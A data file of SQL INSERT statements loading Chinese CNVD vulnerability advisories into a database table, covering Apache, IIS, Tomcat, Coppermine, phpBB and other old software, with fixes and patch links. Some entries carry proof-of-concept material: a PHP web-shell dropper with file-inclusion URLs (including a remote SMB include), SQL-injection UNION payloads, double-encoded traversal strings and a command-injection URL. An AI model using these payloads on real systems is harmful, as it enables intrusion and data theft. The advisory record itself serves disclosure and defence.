"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('Apache 2.0 for Windows目录遍历漏洞', 'CNVD-2002-3296', '2002-08-09', '中', '(暂无)', '', 'CVE-2002-0661', 'Apache是一款广泛流行的开放源代码的WEB服务程序。      Apache 2.0.40以前的for windows版本中存在一个目录遍历漏洞，远程攻击者可以利用这个漏洞获得服务器上任意文件内容甚至执行系统命令。      Apache 2.0.x for windows没有正确检查\'\\'( == %5c)字符，攻击者可能利用这个字符来进行目录遍历攻击。攻击者可能获取与apache同一驱动器下的任意系统文件内容，如果存在可执行目录，例如/cgi-bin,攻击者甚至可以执行任意系统命令。      Unix和其他平台的Apache Web服务程序不受此漏洞影响，Cygwin用户受到此漏洞影响。      ', '', 'Apache Group  ------------  目前厂商已经发布了2.0.40以修复这个安全问题，请到厂商的主页下载最新版本：      http://www.apache.org/dist/httpd/', '(无补丁信息)', '已验证', '2002-08-09', '2002-08-09', '2002-08-18', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('Apache Tomcat空字节目录/文件泄漏漏洞', 'CNVD-2003-0292', '2003-01-26', '中', '(暂无)', '', 'CVE-2003-0042', 'Apache Tomcat是一个流行的开放源码的JSP应用服务器程序。      Apache Tomcat JDK 1.3.1及其以前版本的软件实现上存在漏洞，远程攻击者可能利用此漏洞获取服务器上目录和文件的内容。      Apache Tomcat对存在空字节(%00)和反斜杠(\'\\')字符的web请求的处理上存在漏洞，可能会泄漏目录和文件的内容。', '', 'Apache  ------  目前厂商已经在3.3.1a及其以后版本的软件中修复了这个安全问题，请到厂商的主页下载：      http://jakarta.apache.org/tomcat/index.html    Debian  ------  Debian已经为此发布了一个安全公告（DSA-246-1）以及相应补丁:   DSA-246-1：New tomcat packages fix information exposure and cross site scripting   链接：http://www.debian.org/security/2003/dsa-246      补丁下载：      Source archives:      http://security.debian.org/pool/updates/contrib/t/tomcat/tomcat_3.3a-4woody1.dsc   Size/MD5 checksum: 714 1c34b1fdedf90ea10531ed12a8c6ae0b   http://security.debian.org/pool/updates/contrib/t/tomcat/tomcat_3.3a-4woody1.diff.gz   Size/MD5 checksum: 15146 c58c7edd2df1a806b510068ab7a9a04f   http://security.debian.org/pool/updates/contrib/t/tomcat/tomcat_3.3a.orig.tar.gz   Size/MD5 checksum: 2087545 2df39325c7293ee11ae5547281ca1077      Architecture independent components:      http://security.debian.org/pool/updates/contrib/t/tomcat/tomcat_3.3a-4woody1_all.deb   Size/MD5 checksum: 1196810 1ed6efa36586a8a3d3b527aeebbc4531      Intel IA-32 architecture:      http://security.debian.org/pool/updates/contrib/t/tomcat/libapache-mod-jk_3.3a-4woody1_i386.deb   Size/MD5 checksum: 51522 1e11d6a43654fc6d921c8bc90ad15b4b      补丁安装方法：      1. 手工安装补丁包：      首先，使用下面的命令来下载补丁软件：   # wget url (url是补丁下载链接地址)      然后，使用下面的命令来安装补丁：    # dpkg -i file.deb (file是相应的补丁名)      2. 使用apt-get自动安装补丁包：      首先，使用下面的命令更新内部数据库：   # apt-get update      然后，使用下面的命令安装更新软件包：   # apt-get upgrade', '(无补丁信息)', '已验证', '2003-01-26', '2003-01-26', '2003-01-26', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('Blazix密码保护目录远程信息泄露漏洞', 'CNVD-2002-3464', '2002-08-25', '中', '(暂无)', '', '', 'Blazix是一款免费开放源代码的由JAVA编写的WEB服务程序，可使用在Linux和Microsoft Windows操作系统下。      Blazix没有很正确的处理包含特殊字符的请求，远程攻击者可以利用这个漏洞访问受密码保护的目录。      Blazix可以对目录进行密码保护，但是Blazix的对特殊字符\'+\'和\'\\'(不是%2b和%5c)没有进行正确的解析，攻击者可以在受保护的目录名后追加\'+\'或者\'\\'字符，可导致列出保护目录中的所有文件信息。', '', 'Desiderata Software  -------------------  目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：      http://www.blazix.com/', '(无补丁信息)', '已验证', '2002-08-25', '2002-08-25', '2002-08-28', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('Microsoft IIS CGI文件名错误解码漏洞（MS01-026）', 'CNVD-2001-1124', '2001-05-15', '高', '(暂无)', '', 'CVE-2001-0333', 'IIS 是微软出品的一个广泛应用的Internet Web服务器软件，随Windows NT和Windows 2000捆绑发售。默认情况下IIS的某些目录是允许通过提交HTTP请求执行可执行文件的。      NSFOCUS安全小组发现微软IIS 4.0/5.0在处理CGI程序文件名时存在一个安全漏洞，由于错误地对文件名进行了两次解码，远程攻击者可能利用此漏洞以Web进程的权限在主机上执行任意系统命令。      IIS在加载可执行CGI程序时，会进行两次解码。第一次解码是对CGI文件名进行http解码，然后判断此文件名是否为可执行文件，例如检查后缀名是否为&quot;.exe&quot;或&quot;.com&quot;等等。在文件名检查通过之后，IIS会再进行第二次解码。正常情况下，应该只对该CGI的参数进行解码，然而，IIS错误地将已经解码过的CGI文件名和CGI参数一起进行解码。这样，CGI文件名就被错误地解码了两次。      通过精心构造CGI文件名，攻击者可以绕过IIS对文件名所作的安全检查，例如对&quot;../&quot;或&quot;./&quot;的检查，在某些条件下，攻击者可以执行任意系统命令。      例如，对于\'\\'这个字符，正常编码后是%5c。这三个字符对应的编码为：   \'%\' = %25   \'5\' = %35   \'c\' = %63      如果要对这三个字符再做一次编码，就可以有多种形式，例如：   %255c   %%35c   %%35%63    %25%35%63   ...      因此，&quot;..\&quot;就可以表示成&quot;..%255c&quot;或&quot;..%%35c&quot;等等形式。      在经过第一次解码之后，变成&quot;..%5c&quot;。IIS会认为这是一个正常的字符串，不会违反安全规则检查。而在第二次被解码之后，就会变成&quot;..\&quot;。因此攻击者就可以使用&quot;..\&quot;来进行目录遍历，执行Web目录之外的任意程序。   ', '', 'Microsoft  ---------  Microsoft已经为此发布了一个安全公告（MS01-026）以及相应补丁:   MS01-026：14 May 2001 Cumulative Patch for IIS   链接：http://www.microsoft.com/technet/security/bulletin/MS01-026.asp      补丁下载：      Microsoft IIS 4.0:   http://www.microsoft.com/Downloads/Release.asp?ReleaseID=29787      Microsoft IIS 5.0:   http://www.microsoft.com/Downloads/Release.asp?ReleaseID=29764', '(无补丁信息)', '已验证', '2001-05-15', '2001-05-15', '2001-05-15', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('Coppermine Photo Gallery远程代码注入漏洞', 'CNVD-2006-0953', '2006-02-18', '高', '(暂无)', '', 'CVE-2006-0872', 'Coppermine是用PHP编写的多用途集成web图形库脚本。       Coppermine存在多个输入验证漏洞，攻击者可能利用这些漏洞在服务器上以Web进程权限在主机上执行任意命令。      由于没有正确的过滤用户输入，导致Coppermine中存在多个本地/远程文件包含问题：      1、在include/init.inc.php文件308-343行附近的处理lang参数时：      ...   // Process language selection if present in URI or in user profile or try   // autodetection if default charset is utf-8   if (!empty($_GET[\'lang\']))   {   $USER[\'lang\'] = $_GET[\'lang\']; [!!!!!!!!!!!!!!]   }      if (isset($USER[\'lang\']) &amp;&amp; !strstr($USER[\'lang\'], \'/\') &amp;&amp; file_exists(\'lang/\' . $USER[\'lang\'] . \'.php\'))   {   $CONFIG[\'default_lang\'] = $CONFIG[\'lang\']; // Save default language   $CONFIG[\'lang\'] = strtr($USER[\'lang\'], \'$/\\:\*?&quot;\\'&amp;lt;&gt;|`\', \'____________\');   }   elseif ($CONFIG[\'charset\'] == \'utf-8\')   {   include(\'include/select_lang.inc.php\');   if (file_exists(\'lang/\' . $USER[\'lang\'] . \'.php\'))   {   $CONFIG[\'default_lang\'] = $CONFIG[\'lang\']; // Save default language   $CONFIG[\'lang\'] = $USER[\'lang\']; // [!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]   }   }   else   {   unset($USER[\'lang\']);   }      if (isset($CONFIG[\'default_lang\']) &amp;&amp; ($CONFIG[\'default_lang\']==$CONFIG[\'lang\']))   {   unset($CONFIG[\'default_lang\']);   }   if (!file_exists(&quot;lang/{$CONFIG[\'lang\']}.php&quot;)) [!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]   $CONFIG[\'lang\'] = \'english\';      // We load the chosen language file   require &quot;lang/{$CONFIG[\'lang\']}.php&quot;; [!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!]   ...      无需登录就可以包含任意本地文件。在[!!!!!]部分代码如下：      ...   $USER[\'lang\'] = $_GET[\'lang\'];   ...   $CONFIG[\'lang\'] = $USER[\'lang\'];   ...   if (!file_exists(&quot;lang/{$CONFIG[\'lang\']}.php&quot;))   $CONFIG[\'lang\'] = \'english\';   ...   require &quot;lang/{$CONFIG[\'lang\']}.php&quot;;      仅需使用&ldquo;../&rdquo;和空字符提供已有文件，上传恶意zip文件。在该文件中假设有以下php代码：      &amp;lt;?php   $suntzu=fopen(&quot;shell.php&quot;,&quot;w&quot;);   fputs($suntzu,&quot;&amp;lt;?php system(\$HTTP_GET_VARS[CMD]);?&gt;&quot;);   fclose($suntzu);   chmod(&quot;shell.php&quot;,777);   ?&gt;      现在：      http://[target]/[path]/thumbnails.php?lang=../albums/userpics/10002/shell.zip%00      这样就可以在目标系统启动命令：      http://[target]/[path]/shell.php?CMD=ls%20-la         2、在docs/showdoc.php文件21行中的漏洞代码：      ...   if (isset($_REQUEST[\'f\'])) { $file = $_REQUEST[\'f\']; } else { $file = \'\'; }   ...      poc：http://[target]/[path]/docs/showdoc.php?f=c:\boot.ini   http://[target]/[path]/docs/showdoc.php?f=\\192.168.1.2\c\shell.php      如果magic_quotes_gpc=on的话，斜线后的&ldquo;c:\\boot.ini&rdquo;就变成了&ldquo;c:\boot.ini&rdquo;，&ldquo;\\\\192.168.1.2\\c\\shell.php&rdquo;变成&ldquo;\\192.168.1.2\c\shell.php&rdquo;。      poc 2：http://[target]/[path]/docs/showdoc.php?f=c:\\boot.ini   http://[target]/[path]/docs/showdoc.php?f=\\\\192.168.1.2\\c\\shell.php      如果magic_quotes_gpc=off，&ldquo;f&rdquo;变成&ldquo;c:\boot.ini&rdquo;或&ldquo;\\192.168.1.2\c\shell.php&rdquo;，这样攻击者就可以包含本地或外部（Samba）资源。', '', 'Coppermine  ----------  目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：      http://www.chezgreg.net/coppermine/', '(无补丁信息)', '已验证', '2006-02-18', '2006-02-18', '2006-02-18', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('Novell NetBasic Scripting Server目录遍历漏洞', 'CNVD-2002-3425', '2002-08-20', '高', '(暂无)', '', 'CVE-2002-1417', 'NetBasic Scripting Server是一款NOVELL公司开发的由Web页访问数据库的技术，类似Perl代码执行。Perl -v显示版本信息，类似Microsoft公司的ASP与ADO等。      NetBasic Scripting Server存在一个目录遍历漏洞，远程攻击者可以利用这些漏洞访问未授权资源。      NetBasic Scripting Server对Unicode字符缺少正确的过滤，用户可以提交包含%5c的字符绕过目录限制，访问上级目录内容。当NetBasic scripting server (NSN)映射为可访问资源时，一般以 http://servername.whatever.com/nsn/whatever 方式处理请求，虽然NetBasic Scripting Server对如.../nsn/../dir/script或...nsn/..\dir/script这样的请求作了限制，但是如果使用%5c作为\'\\'符号使用，攻击者就可以以NetBasic Scripting Server进程的权限遍历服务器目录，查看系统任意文件内容。', '', 'Novell  ------  Novell已经为此发布了一个安全公告（NOVL-2002-2963297）以及相应补丁:   NOVL-2002-2963297：NetBasic Buffer Overflow + Scripting Vulnerability   链接：http://support.novell.com/servlet/tidfinder/2963297      Novell公司已经提供补丁程序，但这个补丁是BETA版本，所以只有注册用户(不需要费用)才能下载：      http://support.novell.com/servlet/filedownload/ftf/nscript1.exe/      这个补丁展开来之后建立NSCRIPT.ZIP文件，解压这个ZIP文件到SYS：卷，然后重新启动服务器。', '(无补丁信息)', '(暂无验证信息)', '2002-08-20', '2002-08-20', '2002-08-22', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('phpBB Knowledge Base模块SQL注入和完整路径泄露漏洞', 'CNVD-2005-0916', '2005-04-19', '高', '(暂无)', '', '', 'phpBB是一种用PHP语言实现的基于Web的开放源码论坛程序，使用较为广泛。它支持多种数据库作为后端，如Oracle、MSSQL、MySql、PostGres等等。      phpBB的Knowledge Base模块中存在SQL注入漏洞，远程攻击者可能利用此漏洞非法操作数据库。      起因是应用程序在SQL请求中使用用户输入之前没有正确的过滤输入。如果用户能够提供如下输入的话：      /kb.php?mode=cat&amp;cat=\'      就可得到类似的错误消息：      Could not obtain category data   DEBUG MODE   SQL Error : 1064 You have an error in your SQL syntax   SELECT \* FROM phpbb_kb_categories WHERE category_id = \\'   Line : 131   File : /here/is/the/full/path/functions_kb.php      /kb.php?mode=cat&amp;cat=0+UNION+SELECT+0,0,0,0,0,0+FROM+phpbb_users+WHERE+1=0   No match: Categorie doesn\'t exist.      /kb.php?mode=cat&amp;cat=0+UNION+SELECT+0,0,0,0,0,0+FROM+phpbb_users   Match: DEBUG MODE - SQL-Error      成功利用该漏洞可能导致入侵应用程序，泄漏或修改数据等。', '', 'phpBB Group  -----------  目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：      http://www.phpbb.com/', '(无补丁信息)', '已验证', '2005-04-19', '2005-04-19', '2005-04-19', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('CNVD-2006-2731', 'CNVD-2006-2731', '2006-04-27', '高', '(暂无)', '', '', '危害远程攻击者可以利用漏洞以进程权限执行任意指令。攻击所需条件攻击者必须可以构建恶意WEB页，诱使用户访问。漏洞信息Juniper SSL-VPN Client是一款通过SSL通信的VPN客户端。Juniper SSL-VPN Client ActiveX控件存在一个缓冲区溢出问题，远程攻击者可以利用漏洞以进程权限执行任意指令。问题存在于JuniperSetupDLL.dll，此程序由JuniperSetup.ocx ActiveX控件装载，如果ProductName参数的名字为抄茶馆内字符串，在JuniperSetupDLL.dll上就可以触发基于堆栈的缓冲区溢出，受影响函数如下：.text:04F15783 ; int __stdcall sub_4F15783_ilvdlp(char\*szProductName,LPCSTR lpValueName,LPBYTE lpData,LPDWORD lpcbData).text:04F15783 sub_4F15783_ilvdlp proc near.text:04F15783.text:04F15783 SubKey = byte ptr -10Ch.text:04F15783 Type = dword ptr -8.text:04F15783 hKey = dword ptr -4....text:04F157BF lea eax, [ebp+SubKey].text:04F157C5 push offset szUninstallRegistryKey.text:04F157CA push eax.text:04F157CB call strcpy.text:04F157D0 push [ebp+szProductName].text:04F157D3 lea eax, [ebp+SubKey].text:04F157D9 push eax.text:04F157DA call strcat.data:04F1EA10 ; char szUninstallRegistryKey[].data:04F1EA10 szUninstallRegistryKey db\'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\\',0函数的第一个参数(szProductName)是产品名用于建立反安装注册表键值，&quot;ProductName&quot;参数传递到szProductName中，由于使用strcat()函数没有进行任意边界就覆盖到&quot;SubKey&quot;本地缓冲区，可触发溢出。厂商解决方案可参考如下链接获得补丁方案,请关注以下链接：http://juniper.net/support/security/security_notices.html', 'http://www.securityfocus.com/archive/1/archive/1/432155/100/0/threaded  http://www.securityfocus.com/bid/17712  http://www.kb.cert.org/vuls/id/477604  http://www.frsirt.com/english/advisories/2006/1543  http://www.osvdb.org/25001  http://securitytracker.com/id?1016000  http://secunia.com/advisories/19842  http://xforce.iss.net/xforce/xfdb/26077', '', '(无补丁信息)', '(暂无验证信息)', '2006-04-27', '2006-04-27', '2006-04-27', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('iPlanet Web服务程序搜索组件远程文件泄露漏洞', 'CNVD-2002-3053', '2002-07-09', '中', '(暂无)', '', 'CVE-2002-1042', 'Sun iPlanet Web是一款Sun Microsystems公司开发的商业WEB服务器程序。      Sun iPlanet Web服务的搜索功能在对用户提交的输入缺少过滤，远程攻击者可以利用这个漏洞远程以WEB服务器进程的权限查看系统上的任意文件内容。      Sun iPlanet Web服务包含搜索引擎，使用HTML模式文件从用户中获得搜索参数，通过使用NS-query-pat命令，用户可以指定自己想要查看的系统文件来代替默认的模式文件，不过不幸的是，搜索引擎对要查询的模式文件缺少正确的检查，攻击者可以提交包含多个\'..\\'字符的请求，绕过访问控制，以WEB服务器进程的权限查看系统中的任意文件内容。      Netscape Enterprise Server 3.6也同样存在此问题。', '', 'iPlanet E-Commerce Solutions  ----------------------------  目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：      http://www.iplanet.com/', '(无补丁信息)', '已验证', '2002-07-09', '2002-07-09', '2002-07-19', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('CoreHTTP CGI支持远程命令执行漏洞', 'CNVD-2009-6053', '2009-12-23', '中', '(暂无)', '', '', 'Corehttp是一款小型的HTTP服务程序。CoreHTTP服务器在调用popen()之前不正确过滤用户输入，攻击者可以利用漏洞执行任意命令。部分http.c代码如下： /\* escape the url for &quot; and \ since we use it in popen \*/ for (i = 0; i &amp;lt; PATHSIZE; i++) {  if (url[i] == \'\0\') break;  else if (url[i] == \'\\\' || url[i] == \'\&quot;\' || url[i] == \'\\'\') {   find = url + i;   strcpy(temp, find);   \*find = \'\\\';   \*(find+1) = \'\0\';   strcat(url, temp);   i++;  } } 在上面代码中，只有&quot;和\被转义，允许攻击者指定|`&amp;或其他特定格式字符。如提交http://www.example.com/foo.pl%60command%26%60请求可导致以WEB权限执行任意命令。', '', '', '(无补丁信息)', '(暂无验证信息)', '2009-12-23', '2009-12-23', '2009-12-23', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('Xaraya拒绝服务/文件破坏漏洞', 'CNVD-2005-4428', '2005-11-30', '中', '(暂无)', '', 'CVE-2005-3929', 'Xaraya是一套优秀的内容管理系统。      Xaraya的fopen()中存在文件破坏漏洞，可能导致拒绝服务。xarMLSXML2PHPBackend.php中的漏洞代码如下：      ...   function create($ctxType, $ctxName)   {   assert(\'!empty($this-&gt;baseDir)\');   assert(\'!empty($this-&gt;baseXMLDir)\');   $this-&gt;fileName = $this-&gt;baseDir;   $this-&gt;xmlFileName = $this-&gt;baseXMLDir;      if (!ereg(&quot;^[a-z]+:$&quot;, $ctxType)) {   list($prefix,$directory) = explode(\':\',$ctxType);   if ($directory != &quot;&quot;) {   $this-&gt;fileName .= $directory . &quot;/&quot;;   $this-&gt;xmlFileName .= $directory . &quot;/&quot;;   }   }      $dirForMkDir = $this-&gt;fileName;   if (!file_exists($dirForMkDir)) xarMLS__mkdirr($dirForMkDir, 0777);      $this-&gt;fileName .= $ctxName . &quot;.php&quot;;   $this-&gt;xmlFileName .= $ctxName . &quot;.xml&quot;;      $xmlFileExists = false;   if (file_exists($this-&gt;xmlFileName)) {   if (!($fp1 = fopen($this-&gt;xmlFileName, &quot;r&quot;))) {   xarLogMessage(&quot;Could not open XML input: &quot;.$this-&gt;xmlFileName);   }   $data = fread($fp1, filesize($this-&gt;xmlFileName));   fclose($fp1);   $xml_parser = xml_parser_create();   xml_parse_into_struct($xml_parser, $data, $vals, $index);   xml_parser_free($xml_parser);   $xmlFileExists = true;   } else {   xarLogMessage(&quot;MLS Could not find XML input: &quot;.$this-&gt;xmlFileName);   }      $fp2 = @fopen ($this-&gt;fileName, &quot;w&quot; );   if ($fp2 !== false) {   fputs($fp2, \'&amp;lt;?php\'.&quot;\n&quot;);   fputs($fp2, \'global $xarML_PHPBackend_entries;\'.&quot;\n&quot;);   fputs($fp2, \'global $xarML_PHPBackend_keyEntries;\'.&quot;\n&quot;);   if ($xmlFileExists) {   foreach ($vals as $node) {   if (!array_key_exists(\'tag\',$node)) continue;   if (!array_key_exists(\'value\',$node)) $node[\'value\'] = \'\';   if ($node[\'tag\'] == \'STRING\') {   $node[\'value\'] = str_replace(\'\\'\', \'\\\\'\', $node[\'value\']);   $start = \'$xarML_PHPBackend_entries[\\'\'.$node[\'value\'].&quot;\']&quot;;   } elseif ($node[\'tag\'] == \'KEY\') {   $node[\'value\'] = str_replace(\'\\'\', \'\\\\'\', $node[\'value\']);   $start = \   \'$xarML_PHPBackend_keyEntries[\\'\'.$node[\'value\'].&quot;\']&quot;; } elseif ($node[\'tag\'] == \   \'TRANSLATION\') { if ($this-&gt;outCharset != \'utf-8\') {   $node[\'value\'] = \   $GLOBALS[\'xarMLS_newEncoding\']-&gt;convert($node[\'value\'], \'utf-8\', $this-&gt;outCharset, \   0); }   $node[\'value\'] = str_replace(\'\\'\', \'\\\\'\', $node[\'value\']);   if (!empty($node[\'value\'])) {   fputs($fp2, $start . &quot; = \'&quot;.$node[\'value\'].&quot;\';\n&quot;);   }   }   }   }   fputs($fp2, &quot;?&gt;&quot;);   fclose($fp2);   } else {   xarLogMessage(&quot;Could not create file: &quot;.$this-&gt;fileName);   global $xarML_PHPBackend_entries;   global $xarML_PHPBackend_keyEntries;   if ($xmlFileExists) {   foreach ($vals as $node) {   if (!array_key_exists(\'tag\',$node)) continue;   if (!array_key_exists(\'value\',$node)) $node[\'value\'] = \'\';   if ($node[\'tag\'] == \'STRING\') {   $node[\'value\'] = str_replace(\'\\'\', \'\\\\'\', $node[\'value\']);   $entryIndex = $node[\'value\'];   $entryType = \'string\';   } elseif ($node[\'tag\'] == \'KEY\') {   $node[\'value\'] = str_replace(\'\\'\', \'\\\\'\', $node[\'value\']);   $entryIndex = $node[\'value\'];   $entryType = \'key\';   } elseif ($node[\'tag\'] == \'TRANSLATION\') {   if ($this-&gt;outCharset != \'utf-8\') {   $node[\'value\'] = \   $GLOBALS[\'xarMLS_newEncoding\']-&gt;convert($node[\'value\'], \'utf-8\', $this-&gt;outCharset, \   0); }   $node[\'value\'] = str_replace(\'\\'\', \'\\\\'\', $node[\'value\']);   if ($entryType == \'string\') {   $xarML_PHPBackend_entries[$entryIndex] = $node[\'value\'];   } elseif ($entryType == \'key\') {   $xarML_PHPBackend_keyEntries[$entryIndex] = \   $node[\'value\']; }   }   }   }   }      return true;   }   }   ?&gt;', '', 'Xaraya  ------  目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：      http://www.xaraya.com/', '(无补丁信息)', '已验证', '2005-11-30', '2005-11-30', '2005-11-30', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('CNVD-2004-2752', 'CNVD-2004-2752', '2004-10-12', '中', '(暂无)', '', '', 'Monolith 游戏中存在一些缓存区溢出漏洞。远程用户利用该漏洞可导致游戏崩溃，并且可能导致任意代码执行。远程用户通过发送一个\'\secure\\'Gamespy查询，后跟68个或者更多字符，这样就能够触发缓存区溢出。只有部分字节能够被用于重写缓冲区。一些攻击实例代码如下：http://aluigi.altervista.org/poc/lithsec.zip解决：目前供应商还没有提供解决办法。.一些非官方的补丁程序如下：For Alien versus Predator 2 1.0.9.6:http://aluigi.altervista.org/patches/avp2-1096-fix.zipFor Blood 2 2.1:http://aluigi.altervista.org/patches/blood2-21-fix.zipFor No one lives forever 1.004:http://aluigi.altervista.org/patches/nolf1004-fix.zipFor Shogo 2.2:http://aluigi.altervista.org/patches/shogo22-fix.zip', 'http://securitytracker.com/alerts/2004/Oct/1011603.html  http://securitytracker.com/alerts/2004/Oct/1011603.html', '', '(无补丁信息)', '(暂无验证信息)', '2004-10-12', '2004-10-12', '2004-10-12', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('GoAhead WebServer目录管理策略可绕过漏洞', 'CNVD-2004-0174', '2004-01-19', '中   (AV:N/AC:L/Au:N/C:P/I:N/A:N)', '(暂无)', '9450', '', 'GoAhead WebServer是一款开放源代码的嵌入式WEB服务器程序，支持Active Server Pages、嵌入式Javascript、SSL验证和加密，广泛使用在Microsoft Windows和Linux操作系统下。GoAhead WebServer在处理部分HTTP GET请求时存在问题，远程攻击者可以利用这个漏洞绕过目录管理策略，未授权访问服务器上的资源。GoAhead WebServer存在一个内部问题，它可以接收不以斜杠开头或包含反斜杠(\'\\'或\'%5c\')的请求，如服务程序接收正确的&quot;GET /file HTTP/1.0&quot;请求，也接收&quot;GET file HTTP/1.0&quot;或&quot;GET \file HTTP/1.0&quot;, &quot;GET /\\%5cfile HTTP/1.0&quot;等请求，因此可绕过一些特殊的目录限制管理，未授权访问受限资源，导致敏感信息泄露。', '链接：http://marc.theaimsgroup.com/?l=bugtraq&amp;m=107453787122333&amp;w=2', '建议：临时解决方法：如果您不能立刻安装补丁或者升级，NSFOCUS建议您采取以下措施以降低威胁：\* 在handler.c文件中函数&quot;int websUrlHandlerRequest(webs_t wp)265行处增加如下代码：   if((wp-&gt;path[0] != \'/\') || strchr(wp-&gt;path, \'\\\')) {       websError(wp, 400, T(&quot;Bad request&quot;));       return(0);   }厂商补丁：GoAhead Software----------------目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：http://www.goahead.com/webserver/webserver.htm', '(无补丁信息)', '已验证', '2013-03-14', '2014-01-23', '2014-01-23', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('BRS WebWeaver MKDIR目录遍历漏洞', 'CNVD-2003-0128', '2003-01-10', '高   (AV:N/AC:L/Au:N/C:P/I:P/A:P)', 'WebWeaver BRS 1.01', '6585', '', 'BRS WebWeaver是一款集成小型快速的HTTP和FTP服务程序，提供目录保护功能，适用于Windows 9x/NT操作系统。BRS WebWeaver的FTP服务程序不正确处理用户提交的输入参数，远程攻击者可以利用这个漏洞通过目录遍历攻击，以FTP权限在系统上建立任意目录。由于FTP服务程序对用户提交的输入缺少过滤，攻击者提交包含多个\'..\\'字符的目录名作为mkdir参数，可以绕过FTP ROOT目录在系统上建立任意目录。', 'http://marc.theaimsgroup.com/?l=bugtraq&amp;m=104221983631308&amp;w=2', '目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：http://www.bsoutham.org/WebWeaver/', '(无补丁信息)', '已验证', '2003-01-08', '2003-01-10', '2003-01-10', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('Nullsoft SHOUTcast远程拒绝服务攻击漏洞', 'CNVD-2002-0106', '2002-01-19', '高', '(暂无)', '', 'CVE-2002-0199', 'Nullsoft SHOUTcast是一个免费的网上广播程序，可以使家里的PC向网络上的收听者进行广播。它采用MP3压缩技术，可运行于Windows和Unix类平台下。      SHOUTcast存在设计问题，远程攻击者可以对服务器程序实施拒绝服务攻击。      当shoutcast所带的admin.cgi程序收到并处理特定的超长请求(例如一串超长的反斜杠\'\\')时，服务器进程就会崩溃。   ', '', 'Nullsoft  --------  目前厂商还没有提供补丁或者升级程序，我们建议使用此软件的用户随时关注厂商的主页以获取最新版本：      http://www.shoutcast.com', '(无补丁信息)', '已验证', '2002-01-19', '2002-01-19', '2002-01-23', '(无附件)')"
------------------------
"INSERT INTO vul_lib_cnvd         (hole_info, cnvd, pub_time, danger_lev, affect_pro, bugtraq, cve, hole_desc, ref_url, hole_sol_way, patch, verified, report_time, record_time, upd_time, hole_file) VALUES         ('', '', '', '', '', '', '', '', '', '', '', '', '', '', '', '')"
------------------------
